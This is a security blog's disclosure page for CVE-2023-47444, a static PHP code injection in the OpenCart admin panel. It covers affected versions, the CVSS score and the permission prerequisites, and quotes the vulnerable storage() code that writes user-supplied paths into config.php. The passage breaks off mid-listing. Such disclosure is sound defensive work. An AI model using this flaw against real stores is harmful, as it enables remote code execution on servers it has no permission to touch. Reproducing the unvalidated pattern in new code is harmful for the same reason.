<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Authenticated Static Code Injections in OpenCart (CVE-2023-47444)" />
<meta property="og:locale" content="en" />
<meta name="description" content="In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security access and modify privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server." />
<meta property="og:description" content="In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security access and modify privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server." />
<link rel="canonical" href="http://localhost:4000/posts/opencart-CVE-2023-47444/" />
<meta property="og:url" content="http://localhost:4000/posts/opencart-CVE-2023-47444/" />
<meta property="og:site_name" content="0xbro" />
<meta property="og:image" content="http://localhost:4000/assets/img/opencart-rce-CVE-2023-47444/storage-rce.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-11-14T00:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/opencart-rce-CVE-2023-47444/storage-rce.png" />
<meta property="twitter:title" content="Authenticated Static Code Injections in OpenCart (CVE-2023-47444)" />
<meta name="twitter:site" content="@sec_0xbro" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-11-14T00:00:00+01:00","datePublished":"2023-11-14T00:00:00+01:00","description":"In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security access and modify privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server.","headline":"Authenticated Static Code Injections in OpenCart (CVE-2023-47444)","image":"http://localhost:4000/assets/img/opencart-rce-CVE-2023-47444/storage-rce.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/opencart-CVE-2023-47444/"},"url":"http://localhost:4000/posts/opencart-CVE-2023-47444/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Authenticated Static Code Injections in OpenCart (CVE-2023-47444) | 0xbro
  </title>

  <!--
  Custom Favicons - using favicon.ico only
-->

<link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.png">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.png">

  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/0xbro-light.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">0xbro</a>
    <p class="site-subtitle fst-italic mb-0">A penetration tester, vulnerability researcher, content creator & wannabe ethical hacker blog.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>

      <!-- Main tabs: Talks, Side projects, About (order 1-4) -->
      
        
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              <span>ABOUT</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/timeline/" class="nav-link">
              <i class="fa-fw fas fa-timeline"></i>
              <span>TIMELINE</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/disclosure/" class="nav-link">
              <i class="fa-fw fas fa-handshake"></i>
              <span>DISCLOSURE</span>
            </a>
          </li>
        
      
        
      
        
      
        
      
        
      

      <!-- Separator -->
      <li class="nav-item nav-separator">
        <hr class="sidebar-divider">
      </li>

      <!-- Blog tabs: Archive, Categories, Tags (order 5+) -->
      
        
      
        
      
        
      
        
          <li class="nav-item">
            <a href="/categories/" class="nav-link">
              <i class="fa-fw fas fa-stream"></i>
              <span>CATEGORIES</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/projects/" class="nav-link">
              <i class="fa-fw fas fa-code"></i>
              <span>PROJECTS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              <span>TAGS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/archives/" class="nav-link">
              <i class="fa-fw fas fa-archive"></i>
              <span>ARCHIVES</span>
            </a>
          </li>
        
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    

      
        <a
          href="https://github.com/0xb120"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    

      
        <a
          href="https://twitter.com/sec_0xbro"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
          
      

      
        <a
          href="https://www.linkedin.com/in/mattia-brollo-b4129614b/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
          
        

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Authenticated Static Code Injections in OpenCart (CVE-2023-47444)</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Authenticated Static Code Injections in OpenCart (CVE-2023-47444)</h1>
    
      <p class="post-desc fw-light mb-4">In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security access and modify privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server.</p>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1699916400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Nov 14, 2023
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/opencart-rce-CVE-2023-47444/storage-rce.png" class="popup img-link preview-img shimmer"><img src="/assets/img/opencart-rce-CVE-2023-47444/storage-rce.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/sec_0xbro">0xbro</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2764 words"
>
  <em>15 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Authenticated Static Code Injections in OpenCart (CVE-2023-47444)</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Authenticated Static Code Injections in OpenCart (CVE-2023-47444)</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <blockquote class="abstract">
  <p>In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having <code class="language-plaintext highlighter-rouge">common/security</code> “access” and “modify” privileges can write arbitrary untrusted data inside <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">admin/config.php</code>, resulting in remote code execution on the underlying server.</p>
</blockquote>

<hr />

<h3 id="summary"><span class="me-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<dl>
  <dt>Product</dt>
  <dd><a href="https://github.com/opencart/opencart">OpenCart</a></dd>
  <dt>Vendor</dt>
  <dd><a href="https://www.opencart.com/index.php?route=common/home">OpenCart</a></dd>
  <dt>Severity</dt>
  <dd>High</dd>
  <dt>Affected Version(s)</dt>
  <dd>4.0.0.0 - 4.0.2.3</dd>
  <dt>Tested Version(s)</dt>
  <dd>4.0.2.2, 4.0.2.3</dd>
  <dt>CVE</dt>
  <dd><a href="https://www.cve.org/CVERecord?id=CVE-2023-47444">CVE-2023-47444</a></dd>
  <dt>CVE Description</dt>
  <dd>In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security "access" and "modify" privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server.</dd>
  <dt>CWE</dt>
  <dd><a href="https://cwe.mitre.org/data/definitions/96.html">CWE-96: Improper Neutralization of Directives in Statically Saved Code</a></dd>
</dl>

<h4 id="cvss-31-score"><span class="me-2">CVSS 3.1 Score</span><a href="#cvss-31-score" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p><strong>Base Score:</strong> 8.8 (High)<br />
<strong>Vector String:</strong> <code class="language-plaintext highlighter-rouge">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th><strong>Metric</strong></th>
      <th><strong>Value</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Attack Vector (AV)</strong></td>
      <td>Network</td>
    </tr>
    <tr>
      <td><strong>Attack Complexity (AC)</strong></td>
      <td>Low</td>
    </tr>
    <tr>
      <td><strong>Privileges Required (PR)</strong></td>
      <td>Low</td>
    </tr>
    <tr>
      <td><strong>User Interaction (UI)</strong></td>
      <td>None</td>
    </tr>
    <tr>
      <td><strong>Scope (S)</strong></td>
      <td>Unchanged</td>
    </tr>
    <tr>
      <td><strong>Confidentiality (C)</strong></td>
      <td>High</td>
    </tr>
    <tr>
      <td><strong>Integrity (I)</strong></td>
      <td>High</td>
    </tr>
    <tr>
      <td><strong>Availability (A)</strong></td>
      <td>High</td>
    </tr>
  </tbody>
</table></div>

<h4 id="group-privileges-and-considerations"><span class="me-2">Group Privileges and considerations</span><a href="#group-privileges-and-considerations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>OpenCart manages privileges following a “matrix” approach, where read (access) and write (modify) permissions can be granted on every specific route, for any “User Group”.</p>

<p class="text-center"><a href="/assets/img/opencart-rce-CVE-2023-47444/permissions.png" class="popup img-link shimmer"><img src="/assets/img/opencart-rce-CVE-2023-47444/permissions.png" alt="permissions" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">common/security</code> is the route that (optionally) moves the <code class="language-plaintext highlighter-rouge">storage</code> folder out of the application root once the installation is complete, renames the <code class="language-plaintext highlighter-rouge">/admin</code> path to something new, and removes the installation folder when the installation process is finish.</p>

<p class="text-center"><a href="/assets/img/opencart-rce-CVE-2023-47444/common-security.gif" class="popup img-link shimmer"><img src="/assets/img/opencart-rce-CVE-2023-47444/common-security.gif" alt="common-security" loading="lazy"></a></p>

<p>By default, OpenCart has only one administrator group and user, having full read/write permissions. All the other new users must be created and configured from scratch, including their permissions, so it depends on the individual configuration whether <code class="language-plaintext highlighter-rouge">common/security</code> is included or not.</p>

<p>In my personal experience, I tested different client’s OpenCart installations, and many times I found non-administrative users (such as sales account, brand operators, support accounts, etc.) having the <code class="language-plaintext highlighter-rouge">common/security</code> permissions enabled. Reasons can range from misconception of the “common” privilege group, to lazyness of sysadmins applying a black-list approach (enabling everything with the “All” option and then removing only some permissions) instead of selecting only the specific desired permissions.</p>

<p>From a pure threat model perspective, so, the vulnerability has some important pre-requisites (see also <a href="http://localhost:4000/posts/opencart-CVE-2023-47444/#exploit-conditions-and-prerequisites">Exploit Conditions and Prerequisites</a>) that makes exploitation not so common and significantly lower the risk. Considering the various installation I tested in the past, however, we cannot assume that other installations do not also share the same bad practice. It may be that companies create and use other profiles besides <code class="language-plaintext highlighter-rouge">admin</code> and that these profiles include <code class="language-plaintext highlighter-rouge">common/security</code>, just as it may be that the numbers are significantly lower and that my cases were exceptions.</p>

<h2 id="vulnerabilities"><span class="me-2">Vulnerabilities</span><a href="#vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>There are two distinct static code injection vulnerabilities in the function that moves the <code class="language-plaintext highlighter-rouge">storage</code> folder outside the application web root, and the function that renames the secret <code class="language-plaintext highlighter-rouge">admin</code> path after the installation. While the latter can be exploited only if the <code class="language-plaintext highlighter-rouge">admin</code> folder has not yet been renamed, the former can be exploited anytime, even if the <code class="language-plaintext highlighter-rouge">storage</code> folder has already been moved. Both vulnerabilities require that the user has the <code class="language-plaintext highlighter-rouge">common/security</code> “access” and “modify” privileges enabled. Exploiting them, an authenticated adversary can inject arbitrary static PHP code that will be executed by every page, resulting in arbitrary remote code execution. Those vulnerabilities were both introduced from OpenCart 4.0.0.0 onward.</p>

<blockquote class="warning">
  <p>Because of the nature of the vulnerabilities, it is very likely to create disruption and break the application completely if the configuration files and the actual directories created on disk do not match at the end of exploitation.</p>
</blockquote>

<h3 id="vulnerabilities-details-and-root-causes"><span class="me-2">Vulnerabilities Details and Root Causes</span><a href="#vulnerabilities-details-and-root-causes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="static-code-injection-in-commonsecuritystorage"><span class="me-2">Static Code Injection in common/security.storage</span><a href="#static-code-injection-in-commonsecuritystorage" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<blockquote class="bug">
  <p>The <code class="language-plaintext highlighter-rouge">storage()</code> function in <code class="language-plaintext highlighter-rouge">upload/admin/controller/common/security.php</code> is vulnerable to PHP static code injection because <code class="language-plaintext highlighter-rouge">$name</code> and <code class="language-plaintext highlighter-rouge">$path</code> user-controlled variables are concatenated and placed inside <code class="language-plaintext highlighter-rouge">$base_new</code>, which is then written inside the <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">admin/config.php</code> files, without proper escape or validation.</p>
</blockquote>

<p>The relevant vulnerable code can be found below:</p>

<p><em>4.0.2.3/upload/admin/controller/common/security.php</em></p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
</pre></td><td class="rouge-code"><pre><span class="k">public</span> <span class="k">function</span> <span class="n">storage</span><span class="p">():</span> <span class="kt">void</span> <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"page"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$page</span> <span class="o">=</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"page"</span><span class="p">];</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$page</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span> <span class="c1">// [1]</span>
            <span class="s2">"[^a-zA-z0-9_]"</span><span class="p">,</span>
            <span class="s2">""</span><span class="p">,</span>
            <span class="nb">basename</span><span class="p">(</span>
                <span class="nb">html_entity_decode</span><span class="p">(</span>
                    <span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]),</span> 
                    <span class="no">ENT_QUOTES</span><span class="p">,</span>
                    <span class="s2">"UTF-8"</span>
                <span class="p">)</span>
            <span class="p">)</span>
        <span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"path"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span> <span class="c1">// [2]</span>
            <span class="s2">"[^a-zA-z0-9_\:\/]"</span><span class="p">,</span>
            <span class="s2">""</span><span class="p">,</span>
            <span class="nb">html_entity_decode</span><span class="p">(</span>
                <span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"path"</span><span class="p">]),</span> 
                <span class="no">ENT_QUOTES</span><span class="p">,</span>
                <span class="s2">"UTF-8"</span>
            <span class="p">)</span>
        <span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$json</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="nf">hasPermission</span><span class="p">(</span><span class="s2">"modify"</span><span class="p">,</span> <span class="s2">"common/security"</span><span class="p">))</span> <span class="p">{</span>
        <span class="c1">// ...</span>
        <span class="nv">$base_new</span> <span class="o">=</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> <span class="s2">"/"</span><span class="p">;</span>
        <span class="c1">// ...</span>
        <span class="nv">$root</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"</span><span class="se">\\</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"/"</span><span class="p">,</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">server</span><span class="p">[</span><span class="s2">"DOCUMENT_ROOT"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"/../"</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$root</span> <span class="o">||</span> <span class="nv">$root</span> <span class="o">==</span> <span class="nv">$base_new</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [3]</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s2">"error_storage"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$page</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [4]</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s2">"error_storage_exists"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="no">DIR_OPENCART</span> <span class="mf">.</span> <span class="s2">"config.php"</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="no">DIR_APPLICATION</span> <span class="mf">.</span> <span class="s2">"config.php"</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s2">"error_writable"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
